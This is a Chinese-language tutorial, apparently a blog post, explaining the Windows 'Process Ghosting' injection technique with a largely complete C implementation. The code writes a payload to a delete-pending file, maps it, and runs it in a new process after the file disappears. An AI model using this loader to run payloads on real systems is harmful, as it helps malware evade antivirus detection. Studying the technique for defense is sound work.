0x00 简介
=======

Process Ghosting是一种进程注入的方式，既通过修改文件的内容，修改文件映射到内存中的数据，达到执行恶意软件的目的，使用此技术可以执行已删除的恶意软件。

**文章主要内容如下**

程序启动过程

Process Ghosting技术原理

ProcessGhosting代码实现及代码解析

0x01 程序启动过程
===========

进程概述
----

每个进程都会对应一个硬盘上的可执行文件，进程指的是一块空间，进程并不负责执行代码，进程由一个进程的内核对象和一块空间组成，空间中包含可执行文件/dll的代码和数据，线程用来执行进程空间中的代码。

简单地说：进程提供要执行的代码，线程执行这些代码。

程序启动过程
------

1. 读取可执行文件到内存
2. 将可执行文件从filebuffer(磁盘上的状态)拉伸程imagebuffer(运行时的状态)
3. 加载程序运行所需dll
4. 修复程序的Iat表
5. 根据程序的ImageBase申请内存
6. 如果在指定位置申请内存成功就不需要重定位，接着直接执行第9步
7. 如果在指定位置申请内存失败，则在任意位置申请内存
8. 根据内存的地址对程序进行重定位，接着执行第10步
9. 通过ImageBase+AddressOfEntryPoint得到程序入口点
10. 使用申请的内存地址+AddressOfEntryPoint得到程序入口点
11. 得到程序入口点后创建线程执行。

0x02 Process Ghosting原理
=======================

**通过修改设置了删除属性的文件在内存中的映射执行恶意程序**(在关闭文件句柄后，文件将被删除)，Process Ghosting与Process Hollowing有异曲同工之妙，Process Ghosting是把payload写入到文件中，然后映射文件到内存中，而Process Hollowing则是使用payload替换掉了傀儡程序的映射文件。

### 大致过程

首先创建一个文件并为它设置删除属性，然后把payload写入到此文件中，接着为此文件在内存中创建一个映射(把此文件读取到内存中)，这时销毁文件的内核对象(关闭文件的句柄)，然后硬盘上创建的文件就会被删除。

0x03 Process Ghosting过程
=======================

1. 读取payload到内存中
2. 创建一个临时文件
3. 调用**NtCreateFile**函数打开这个文件并得到它的句柄
4. 根据得到的句柄，调用**NtSetInformationFile**函数设置删除属性
5. 根据句柄，调用**NtWriteFile**函数将payloa写入到临时文件中
6. 调用**NtCreateSection**函数为对应的文件创建一份映射，也就是把文件的数据读取到内存中
7. 调用**CloseHandle**函数关闭文件句柄，句柄关闭后，文件将被删除
8. 调用**NtCreateProcessEx**函数使用创建的映射节，创建一个挂起进程
9. 调用**NtQueryInformationProcess**函数查询新建进程的Peb地址，为修复创建进程的peb做准备
10. 调用**ReadProcessMemory**读取新建进程的peb信息到本程序中
11. 根据Payload的pe信息得到**AddressOfEntryPoint(Oep)**，然后根据新建进程的peb信息得到payload的**ImageBase**
12. 调用**RtlCreateProcessParametersEx**函数创建新建进程的参数信息
13. 调用**VirtualAllocEx**在新建进程中申请内存，为写入进程参数做准备
14. 调用**WriteProcessMemory**将进程参数写入到新建进程中
15. 调用**WriteProcessMemory**修复新建进程peb结构的ProcessParameters成员，让此成员指向刚才写入的进程参数
16. 调用**NtCreateThreadEx**创建线程，执行刚才得到的入口点 0x04 Process Ghosting代码解析
    =========================
    
    ok！Process Ghosting的原理和流程上面已经说过了，下面来看Process Ghosting的代码解析。
    
    initFunc函数
    ----------
    
    因为代码调用了一系列Native函数，这些函数无法直接使用，所以我们需要根据函数的定义，使用typedef定义这些函数的函数指针，接着调用**Loadlibrary**和**GetProcAddress**得到对应的函数地址，然后使用函数地址为定义的函数指针赋值，接着调用函数指针就可以调用这些函数。

先看一下`typedef`的用法。

- - - - - -

`typedef 返回类型(新的类型)(参数)`  
使用`typedef`可以为某个类型，起一个新的名字，也可以理解成为现有的类型起一个别名，它还可以直接定义一个新的类型。

栗子

```php
typedef NTSTATUS(NTAPI* pNtCreateFile)(PHANDLE FileHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK   IoStatusBlock,
    PLARGE_INTEGER     AllocationSize,
    ULONG              FileAttributes,
    ULONG              ShareAccess,
    ULONG              CreateDisposition,
    ULONG              CreateOptions,
    PVOID              EaBuffer,
    ULONG              EaLength
    );
```

`typedef NTSTATUS(NTAPI* pNtCreateFile)`定义了一个**pNtCreateFile**类型的函数指针，这个函数指针的返回值是NTSTATUS，第二个括号里是这个函数指针的参数列表。  
好的`typedef`已经介绍过了，下面来看**initFunc**的实现

```php
HMODULE hModule = LoadLibraryW(L"ntdll.dll");
NtCreateFile = (pNtCreateFile)GetProcAddress(hModule, "NtCreateFile");
NtWriteFile = (pNtWriteFile)GetProcAddress(hModule, "NtWriteFile");
RtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddress(hModule, "RtlInitUnicodeString");
NtSetInformationFile = (pNtSetInformationFile)GetProcAddress(hModule, "NtSetInformationFile");
NtCreateSection = (pNtCreateSection)GetProcAddress(hModule, "NtCreateSection");
NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(hModule, "NtCreateProcessEx");
NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hModule, "NtQueryInformationProcess");
RtlCreateProcessParametersEx = (pRtlCreateProcessParametersEx)GetProcAddress(hModule, "RtlCreateProcessParametersEx");
NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hModule, "NtCreateThreadEx");
```

虽然代码看着很多，但是大部分都是在做相同的事情，所以只介绍其中比较重要的部分。

`HMODULE hModule = LoadLibraryW(L"ntdll.dll");`**LoadLibraryW**函数用来加载一个dll，因为我们要用到ntdll中的一些函数，所以要把它加载进来，此函数的返回值是加载的dll的句柄。

`NtCreateFile = (pNtCreateFile)GetProcAddress(hModule, "NtCreateFile");`  
**NtCreateFile**是**pNtCreateFile**类型的一个全局变量，**GetProcAddress**函数功能是根据传入的dll句柄和函数名得到对应的函数地址，第一个参数是，函数所在Dll的句柄，第二个参数是函数的名字，此函数的返回值是对应的函数地址，因为返回值是FAPROC类型，所以需要强转成**pNtCreateFile**类型。

- - - - - -

ReadFile2Memory函数
-----------------

此函数功能是根据传入的路径读取payload到内存中，并返回payload的大小。

**函数实现**

```php
PVOID ReadFile2Memory(PCWSTR Path, PDWORD Size) {//读取要执行的文件到内存中
    DWORD ReadByte = NULL;
    HANDLE hFile = CreateFileW(Path, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("CreateFileW Error:Code:%d\n", GetLastError());
        return 0;
    }
    *Size = GetFileSize(hFile, NULL);
    PVOID buffer = VirtualAlloc(NULL, *Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (buffer == NULL) {
        printf("VirtualAlloc Error Code:%d\n", GetLastError());
        return 0;
    }
    BOOL Code = ReadFile(hFile, buffer, *Size, &ReadByte, NULL);
    if (Code == NULL) {
        printf("ReadFile Error Code:%d\n", GetLastError());
        return 0;
    }
    CloseHandle(hFile);
    hFile = NULL;
    printf("Read Payload To Memory Success Addr:%x\n", buffer);
    return buffer;
}
```

主要是通过调用**CreateFile**函数得到文件的句柄，然后使用**GetFileSize**函数得到文件大小，接着调用**VirtualAlloc**函数申请对应的空间，为调用**ReadFile**函数内存做准备，最后调用**ReadFile**函数读取文件到刚刚申请的空间中。

- - - - - -

**CreateFileW**函数定义

```php
HANDLE CreateFileW(
  [in]           LPCWSTR               lpFileName,
  [in]           DWORD                 dwDesiredAccess,
  [in]           DWORD                 dwShareMode,
  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  [in]           DWORD                 dwCreationDisposition,
  [in]           DWORD                 dwFlagsAndAttributes,
  [in, optional] HANDLE                hTemplateFile
);
```

- **lpFileName**指向要打开文件的路径
- **dwDesiredAccess**代表函数返回的句柄需要哪种访问类型
- **dwShareMode**是文件的请求共享模式，就是我在访问这个文件的时候，别的进程可不可以访问这个文件
- **lpSecurityAttributes**指向SECURITY\_ATTRIBUTES结构的指针，一般操作内核对象的函数都会有这个参数，为NULL即可
- **dwCreationDisposition**文件存在时我要做什么操作，不存在时做什么操作
- **dwFlagsAndAttributes**文件的属性
- **hTemplateFile**为NULL即可

```php
*Size = GetFileSize(hFile, NULL);
PVOID buffer = VirtualAlloc(NULL, *Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

**GetFileSize**函数功能是得到句柄对应文件的大小，**VirtualAlloc**函数功能是申请一块内存，这两行代码在为读取payload到内存中做准备。  
`BOOL Code = ReadFile(hFile, buffer, *Size, &ReadByte, NULL);`通过调用**ReadFile**函数读取payload到内存中。

**ReadFile**定义

```php
BOOL ReadFile(
  [in]                HANDLE       hFile,
  [out]               LPVOID       lpBuffer,
  [in]                DWORD        nNumberOfBytesToRead,
  [out, optional]     LPDWORD      lpNumberOfBytesRead,
  [in, out, optional] LPOVERLAPPED lpOverlapped
);
```

**ReadFile**函数功能是从一个文件句柄中读取数据到指定缓冲区，**hFile**要读取文件的句柄，**lpBuffer**接收读取文件数据的缓冲区指针，**nNumberOfBytesToRead**代表读取多少数据(字节)，**lpNumberOfBytesRead**代表读取了多少字节，**lpOverlapped**为NULL即可。

main函数解析
--------

因为代码比较长，所以我们一部分一部分的看。

```php
InitFunc();
DWORD bufSize = 0;
PVOID buf=ReadFile2Memory(L"C:\\Users\\Admin\\Desktop\\test.exe",&bufSize);//读取文件到内存中
WCHAR tmpPath[MAX_PATH] = {0}; 
WCHAR tmpFilePath[MAX_PATH] = { 0 };
GetTempPathW(MAX_PATH, tmpPath);
GetTempFileNameW(tmpPath, L"R", 0, tmpFilePath);
```

**GetTempPathW**函数功能是，得到系统存储临时文件的路径，并把路径返回到第二个参数指向的缓冲区中，第一个参数是缓冲区的大小。

**GetTempFileNameW**函数功能是，在tmpPath目录下下生成一个临时文件，这个文件的名字是以R开头的，然后返回生成临时文件的路径到tmpFilePath中。

代码首先调用了**InitFunc**函数初始化Native系列api，然后调用**ReadFile2Memory**函数读取文件到内存中，并返回读取文件的大小，接着创建了一个临时文件，并返回了临时文件的路径。

```php
HANDLE hFile = NULL;
WCHAR t_Path[MAX_PATH] = { L"\\??\\" };
StringCchCatExW(t_Path, MAX_PATH, tmpFilePath, NULL, NULL, NULL);
UNICODE_STRING uString = { 0 };
RtlInitUnicodeString(&uString, t_Path);//使用t_path的路径字符串初始化ustring结构
```

**StringCchCatExW**函数功能是拼接字符串，第一个参数是目标缓冲区，此缓冲区中包含要与第三个参数连接的字符串，它们连接的结果会存放到此缓冲区中，第二个参数是目标缓冲区的大小，第三个参数是要与目标缓冲区连接的字符串，剩下的参数为NULL即可。

**UNICODE\_STRING**结构定义

```php
typedef struct _UNICODE_STRING {
  USHORT Length;//缓冲区中字符串的长度
  USHORT MaximumLength;//缓冲区的大小
  PWSTR  Buffer;//指向字符串的指针
} UNICODE_STRING, *PUNICODE_STRING;
```

**RtlInitUnicodeString**函数功能是将一个UNICODE字符串初始化到一个**UNICODE\_STRING**结构。

这里初始化的意思，就是将这个UNICODE字符串相关的属性(如 字符长度，缓冲区大小等)赋值给**UNICODE\_STRING**结构的成员。

**RtlInitUnicodeString**函数的第一个参数是一个指针，它指向要初始化的**UNICODE\_STRING**结构，第二个参数也是一个指针，指向一个UNICODE字符串，在调用完此函数后uString的成员将会是这个字符串的属性。

```php
OBJECT_ATTRIBUTES object = { 0 };
InitializeObjectAttributes(&object, &uString, OBJ_CASE_INSENSITIVE, NULL, NULL);
IO_STATUS_BLOCK block = { 0 };
OBJECT_ATTRIBUTES attr = { 0 };
InitializeObjectAttributes(&attr, &uString, OBJ_CASE_INSENSITIVE, NULL, NULL);
```

**InitializeObjectAttributes**宏功能是用一个**UNICODE\_STRING**结构初始化**OBJECT\_ATTRIBUTES**结构。

第一个参数是一个指向**OBJECT\_ATTRIBUTES**结构的指针，第二个参数指向一个**UNICODE\_STRING**结构数组，第三个参数是一个标志，这个标志用于设置对象句柄属性，最后两个参数为NULL即可。

**OBJECT\_ATTRIBUTES**结构定义

```php
typedef struct _OBJECT_ATTRIBUTES {
  ULONG           Length;
  HANDLE          RootDirectory;//NULL即可
  PUNICODE_STRING ObjectName;
  ULONG           Attributes;//设置对象句柄的属性标志
  PVOID           SecurityDescriptor;//安全描述符，为NULL代表使用默认安全属性
  PVOID           SecurityQualityOfService;//NULL即可
} OBJECT_ATTRIBUTES;
```

**ObjectName**成员是一个**UNICODE\_STRING**结构的指针，**Lengt**代表此结构的长度。

**IO\_STATUC\_BLOCK**结构定义

```php
typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;//IRP完成状态
        PVOID    Pointer;
    };
    ULONG_PTR Information;//这个成员的值依赖于请求的值
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;
```

I/O状态块，显示I/O请求的状态，此结构将作为**NtCreateFile**的参数使用，**NtCreateFile**调用后会设置此结构的值。下面两行代码做的事情上文已经说过了，就不再赘述。

**NtCreateFile**定义

```php
__kernel_entry NTSTATUS NtCreateFile(
  [out]          PHANDLE            FileHandle,
  [in]           ACCESS_MASK        DesiredAccess,
  [in]           POBJECT_ATTRIBUTES ObjectAttributes,
  [out]          PIO_STATUS_BLOCK   IoStatusBlock,
  [in, optional] PLARGE_INTEGER     AllocationSize,
  [in]           ULONG              FileAttributes,
  [in]           ULONG              ShareAccess,
  [in]           ULONG              CreateDisposition,
  [in]           ULONG              CreateOptions,
  [in]           PVOID              EaBuffer,
  [in]           ULONG              EaLength
);
```

- **FileHandle**指向一个句柄，在函数调用成功后，将会把打开文件的句柄放入到此参数指向的句柄中
- **DesireAccess**用于指定对文件的访问权限
- **ObjectAttributes**是一个指向**OBJECT\_ATTRIBUTES**结构的指针
- **IoStatusBlock**是一个**IO\_STATUS\_BLOCK**结构的指针，此结构用于接收完成状态和请求信息
- **AllocationSize**文件初始创建大小为NULL即可
- **FileAttributes**代表创建文件或覆盖时设置的属性
- **ShareAccess**代表共享的访问类型就是在调用此函数的时候允不允许其他线程执行读写操作
- **CreateDisposition**当文件不存在时做做的操作
- **CreateOptions**创建或打开文件时要做的操作

```php
NTSTATUS status=NtCreateFile(&hFile, GENERIC_ALL, &object, &block, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SUPERSEDE, FILE_SEQUENTIAL_ONLY, NULL,NULL);

```

上面这行代码主要作用是，打开临时文件并得到它的句柄，为设置删除属性和写入payload到此文件中做准备。

**NtSetInformationFile**定义

```php
__kernel_entry NTSYSCALLAPI NTSTATUS NtSetInformationFile(
  [in]  HANDLE                 FileHandle,
  [out] PIO_STATUS_BLOCK       IoStatusBlock,
  [in]  PVOID                  FileInformation,
  [in]  ULONG                  Length,
  [in]  FILE_INFORMATION_CLASS FileInformationClass
);
```

- **FileHandle**是要设置信息的文件句柄
- **IoStatusBlock**指向一个**IO\_STATUS\_BLOCK**结构的指针
- **FileInformation**指向存储要设置信息的缓冲区，此参数根据**FileInformationClass**设置
- **Length**设置缓冲区的大小
- **FileInformationClass**表示**FileInformation**参数指向的缓冲区中的信息类型

```php
IO_STATUS_BLOCK deleteBlock = { 0 };
FILE_DISPOSITION_INFORMATION_EX fileInfo = { 0 };
fileInfo.Flags = TRUE;
status=NtSetInformationFile(hFile, &deleteBlock, &fileInfo, sizeof(FILE_DISPOSITION_INFORMATION_EX), FileDispositionInformation);
```

**FILE\_DISPOSITION\_INFORMATION\_EX**结构只有一个Flag成员，此成员用于指定系统如何删除文件。

这段代码主要是定义了一个**FILE\_DISPOSITION\_INFORMATION\_EX**结构，如果此结构的Flag成员为1，代表要删除文件，接着调用了**NtSetInformationFile**函数，为文件设置删除属性。

需要注意的是，在为文件设置完删除属性后，文件并不会会被删除，而是在文件的内核对象销毁后才会被删除。


**NtWriteFile**定义

```php
__kernel_entry NTSYSCALLAPI NTSTATUS NtWriteFile(
  [in]           HANDLE           FileHandle,
  [in, optional] HANDLE           Event,
  [in, optional] PIO_APC_ROUTINE  ApcRoutine,
  [in, optional] PVOID            ApcContext,
  [out]          PIO_STATUS_BLOCK IoStatusBlock,
  [in]           PVOID            Buffer,
  [in]           ULONG            Length,
  [in, optional] PLARGE_INTEGER   ByteOffset,
  [in, optional] PULONG           Key
);
```

**FileHandle**要写入内容的文件的句柄  
**Event**写入操作完成后要设置状态的事件的句柄  
**ApcRoutine**保留参数NULL即可  
**ApcContext**保留参数NULL即可  
**IoStatusBlock**指向一个**IO\_STATUS\_BLOCK**结构的指针  
**Buffer**指向一个缓冲区的指针，缓冲区中存储了要写入的内容  
**Length**代表缓冲区的大小  
**ByteOffset**一个偏移量，指定了要从文件哪里开始写入  
**Key**填NULL即可

```php
IO_STATUS_BLOCK writeBlock = { 0 };
LARGE_INTEGER ByteOffset = {0};
status=NtWriteFile(hFile, NULL, NULL, NULL, &writeBlock, buf, bufSize, &ByteOffset, NULL);
```

这段代码主要作用是将payload写入到临时文件中，为给临时文件创建节做准备。


**NtCreateSection**定义

```php
__kernel_entry NTSYSCALLAPI NTSTATUS NtCreateSection(
  [out]          PHANDLE            SectionHandle,
  [in]           ACCESS_MASK        DesiredAccess,
  [in, optional] POBJECT_ATTRIBUTES ObjectAttributes,
  [in, optional] PLARGE_INTEGER     MaximumSize,
  [in]           ULONG              SectionPageProtection,
  [in]           ULONG              AllocationAttributes,
  [in, optional] HANDLE             FileHandle
);
```

- **SectionHandle**一个指针，用于接收此函数返回的节的句柄
- **DesiredAccess**对节的访问权限
- **ObjectAttributes**指向OBJECT\_ATTRIBUTES结构的指针
- **MaximumSize**节的最大大小
- **SectionPageProtection**节所在内存的属性
- **AllocationAttributes**节的属性
- **FileHandle**文件句柄，也就是要为哪一个文件创建一个节 ```php
    HANDLE hSection = NULL;
    status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
    ```

代码主要作用是为临时文件在内存中创建一个节，也可以理解为把临时文件读取到内存中。


**NtCreateProcessEx**定义

```php
typedef NTSTATUS(NTAPI* pNtCreateProcessEx)(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK  DesiredAccess,
    IN POBJECT_ATTRIBUTES   ObjectAttributes,
    IN HANDLE   ParentProcess,
    IN ULONG    Flags,
    IN HANDLE   SectionHandle,
    IN HANDLE   DebugPort,
    IN HANDLE   ExceptionPort,
    IN BOOLEAN  InJob
    );
```

- **ProcessHandle**是一个指针，用于接收函数完返回的进程句柄
- **DesiredAccess**对进程的访问权限
- **ObjectAttributes**指向OBJECT\_ATTRIBUTES结构的指针
- **ParentProcess**父进程的句柄
- **Flags**进程创建的标志
- **SectionHandle**节的句柄

```php
CloseHandle(hFile);//临时文件会被删除
HANDLE hProcess = NULL;
NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(), CREATE_SUSPENDED, hSection, NULL, NULL, NULL);
```

**CloseHandle**函数用于关闭临时文件的句柄，在句柄关闭后临时文件将被删除，接着调用了**NtCreateProcessEx**函数为创建的节，创建了一个挂起的进程。


**PROCESS\_BASIC\_INFORMATION**结构定义

```php
typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;
```

- **Exitstatus**代表进程的终止状态
- **PebBaseAddress**指向进程的Peb结构地址
- **AffinityMask**代表进程的关联掩码
- **BasePriority**代表进程优先级
- **UniqueProcessId**代表进程id
- **InheritedFromUniqueProcessId**代表父进程id 
    **NtQueryInformationProcess**定义

```php
__kernel_entry NTSTATUS NtQueryInformationProcess(
  [in]            HANDLE           ProcessHandle,
  [in]            PROCESSINFOCLASS ProcessInformationClass,
  [out]           PVOID            ProcessInformation,
  [in]            ULONG            ProcessInformationLength,
  [out, optional] PULONG           ReturnLength
);
```

- **ProcessHandle**进程的句柄
- **ProcessInformationClass**要查询的信息类型
- **ProcessInformation**指向**PROCESS\_BASIC\_INFORMATION**结构的指针**ReturnLength**查询到的信息的大小 ```php
    PROCESS_BASIC_INFORMATION ProcessInfo = { 0 };
    NtQueryInformationProcess(hProcess, ProcessBasicInformation, &ProcessInfo, sizeof(PROCESS_BASIC_INFORMATION), NULL);
    ```

代码功能通过调用**NtQueryInformationProcess**函数查询新建进程的信息，主要是为了得到新建进程的Peb地址。

```php
PEB peb = { 0 };
ReadProcessMemory(hProcess, ProcessInfo.PebBaseAddress, &peb, sizeof(PEB), NULL);
PIMAGE_DOS_HEADER Dos = (PIMAGE_DOS_HEADER)buf;
PIMAGE_NT_HEADERS32 Nt = (PIMAGE_NT_HEADERS32)((PBYTE)buf + Dos->e_lfanew);
ULONGLONG oep = (DWORD)Nt->OptionalHeader.AddressOfEntryPoint;
ULONGLONG Entry = (ULONGLONG)peb.ImageBaseAddress + oep;//新建进程的入口点
```

因为Peb结构体的成员太多，所以只介绍代码中用到的成员  
`ProcessParameters`是一个指向**RTL\_USER\_PROCESS\_PARAMETERS**结构的指针，至于**RTL\_USER\_PROCESS\_PARAMETERS**结构下面会介绍。  
`ImageBaseAddress`进程加载时的基地址(ImageBase)。

**ReadProcessMemory**函数功能是从指定的进程中读取数据，第一个参数是要读取数据的进程的句柄，第二个参数是要读取数据的地址也就是要从哪里开始读取，第三个参数是读取的数据放到哪里，第四个参数是存放读取数据缓冲区的大小，第五个NULL即可。

然后通过payload的pe信息得到了payload的**AddressOfEntryPoint(Oep)**，接着通过peb结构得到了payload的**ImageBase**，接着**ImageBase**与**AddressOfEntryPoint**相加得到payload的真正入口点。


ok！到了这一步，主要的工作已经做完了，下面的代码主要是为进程创建一个进程参数，并修复Peb结构中的**ProcessParameter**成员，修复**ProcessParameter**这一步很重要，如果不修复会导致创建的进程无法运行。


**PRTL\_USER\_PROCESS\_PARAMETERS**结构定义

```php
typedef struct _RTL_USER_PROCESS_PARAMETERS {
  BYTE           Reserved1[16];//系统保留
  PVOID          Reserved2[10];//系统保留
  UNICODE_STRING ImagePathName;
  UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
```

前两个成员都是系统保留的。

- **ImagePathName**代表进程文件的路径
- **CommandLine**代表进程的命令行参数  
    **RTL\_USER\_PROCESS\_PARAMETERS**结构用于保存进程启动时的信息，此结构在未来的windows版本中可能被修改(现在已经改过了&gt;&lt;)。  
    **RtlCreateProcessParametersEx**定义

```php
typedef NTSTATUS(NTAPI* pRtlCreateProcessParametersEx)(PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
PUNICODE_STRING ImagePathName, 
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory, 
PUNICODE_STRING CommandLine, 
PVOID Environment, 
PUNICODE_STRING WindowTitle, 
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo, 
PUNICODE_STRING RuntimeData, 
ULONG Flags
);

```

- **pProcessParameters**是一个指向**RTL\_USER\_PROCESS\_PARAMETERS**结构的指针
- **ImagePathName**指向一个**UNICODE\_STRING**结构，此结构中存储了进程的路径  
    剩下的成员都是与进程有关的信息，如环境变量，进程的命令行，进程的窗口标题等信息。 ```php
    UNICODE_STRING ImagePath = { 0 };
    RtlInitUnicodeString(&ImagePath, L"coo");
    PRTL_USER_PROCESS_PARAMETERS parameters = { 0 };
    RtlCreateProcessParametersEx(&parameters, &ImagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);    
    ```

**RtlCreateProcessParametersEx**函数功能是使用**UNICODE\_STRING**结构初始化**RTL\_USER\_PROCESS\_PARAMETERS**结构。

这段代码功能是使用一个指向**UNICODE\_STRING**结构的指针，设置参数中进程的路径，此结构中包含进程路径的字符串，但这个字符串不一定必须是是路径字符串，也可以是别的字符串，这个参数(**ImagePath**)不可以为null。


**需要注意的点**  
关于**RTL\_USER\_PROCESS\_PARAMETERS**结构，有一点需要注意的是，此结构已经被修改，这里给出修改后的定义。

```php
typedef struct _RTL_USER_PROCESS_PARAMETERS
{
    ULONG MaximumLength;                            // Should be set before call RtlCreateProcessParameters
    ULONG Length;                                   // Length of valid structure
    ULONG Flags;                                    // Currently only PPF_NORMALIZED (1) is known:
                                                    //  - Means that structure is normalized by call RtlNormalizeProcessParameters
    ULONG DebugFlags;

    PVOID ConsoleHandle;                            // HWND to console window associated with process (if any).
    ULONG ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;

    CURDIR CurrentDirectory;                        // Specified in DOS-like symbolic link path, ex: "C:/WinNT/SYSTEM32"
    UNICODE_STRING DllPath;                         // DOS-like paths separated by ';' where system should search for DLL files.
    UNICODE_STRING ImagePathName;                   // Full path in DOS-like format to process'es file image.
    UNICODE_STRING CommandLine;                     // Command line
    PVOID Environment;                              // Pointer to environment block (see RtlCreateEnvironment)
    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;                            // Fill attribute for console window
    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;                     // Name of WindowStation and Desktop objects, where process is assigned
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectores[0x20];
    ULONG EnvironmentSize;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;
```

下面代码的作用是将进程的参数块写入到创建的进程中。

```php
ULONG_PTR End = (ULONG_PTR)parameters + parameters->Length;
SIZE_T buffer_size = End - (ULONG_PTR)parameters;
if (VirtualAllocEx(hProcess, parameters, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) 
{
    if (!WriteProcessMemory(hProcess, (LPVOID)parameters, (LPVOID)parameters, parameters->Length, NULL)) 
    {
        printf("Write Process Parameters Error:%d\n", GetLastError());
        return;
    }
}
```

`ULONG_PTR End = (ULONG_PTR)parameters + parameters->Length;`将结构体首地址与**Length**成员相加得到结束地址。

`SIZE_T buffer_size = End - (ULONG_PTR)para;`使用结束地址减去结构体首地址，得到**RTL\_USER\_PROCESS\_PARAMETERS**结构的大小。

`VirtualAllocEx(hProcess, para, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)`调用**VirtualAllocEx**函数在创建的新进程的指定位置申请内存内存，为写入参数块做准备。

`WriteProcessMemory(hProcess, (LPVOID)para, (LPVOID)para, para->Length, NULL`调用**WriteProcessMemory**函数将进程参数块写入到新进程的内存中。

代码主要作用是，在新创建的进程中的指定位置分配内存，然后将参数块写入到新申请的内存中。


下面的代码作用是修复新进程的Peb结构的**ProcessParameters**成员

```php
SIZE_T written = 0;
PPEB te = ProcessInfo.PebBaseAddress;
if (!WriteProcessMemory(hProcess, &te->ProcessParameters, &para, sizeof(PVOID),&written))
{
    printf("Process Parameter Address Error!");
    return;
}
```

`PPEB te = ProcessInfo.PebBaseAddress;`得到新进程的peb地址，为修复Peb结构的ProcessParameter成员做准备。

`WriteProcessMemory(hProcess, &te->ProcessParameters, &para, sizeof(PVOID),&written)`将进程参数块的地址写入到新进程Peb结构的**ProcessParameters**成员中。

至此，新进程的参数已经修复好了，下一步调用**NtCreateThreadEx**为新进程创建一个线程然后它就可以执行了。


**NtCreateThreadEx**定义

```php
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(PHANDLE ThreadHandle,
ACCESS_MASK DesiredAccess,
POBJECT_ATTRIBUTES ObjectAttributes,
HANDLE ProcessHandle,
PVOID StartRoutine, 
PVOID Argument , 
ULONG CreateFlags, 
SIZE_T ZeroBits, 
SIZE_T StackSize, 
SIZE_T MaximumStackSize, 
PPS_ATTRIBUTE_LIST AttributeList 
);

```

- **ThreadHandle**是一个指针，用于接收函数完返回的线程句柄
- **DesiredAccess**对线程的访问权限
- **ObjectAttributes**指向**OBJECT\_ATTRIBUTES**结构的指针
- **ProcessHandle**进程的句柄，代表要为哪一个进程创建一个线程
- **STartToutine**是线程的入口点，也就是创建的线程要执行的函数/代码
- **Argument**执行的函数的参数
- **CreateFlags**标志，表示创建出来的线程是什么状态

```php
HANDLE hThread = NULL;
status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)Entry, NULL, FALSE, 0, 0, 0, NULL);
```

代码作用是，调用**NtCreateThreadEx**函数为新进程创建一个线程，线程执行的函数是payload的入口点，**NtCreateThreadEx**函数调用后payload就会开始运行。

0x05总结
======

Process Ghosting技术，并不是真正的无文件，而是先创建一个文件把它映射到内存中，然后再删除它，所以整个过程中，payload还是会有一段时间在硬盘上存在。

**非常感谢您读到这里，由于作者水平有限，文章中难免会出现一些错误，恳请各位师傅们批评指正。**

0x06参考
======

[https://github.com/hasherezade/process\_ghosting](https://github.com/hasherezade/process_ghosting)  
<https://github.com/knightswd/ProcessGhosting>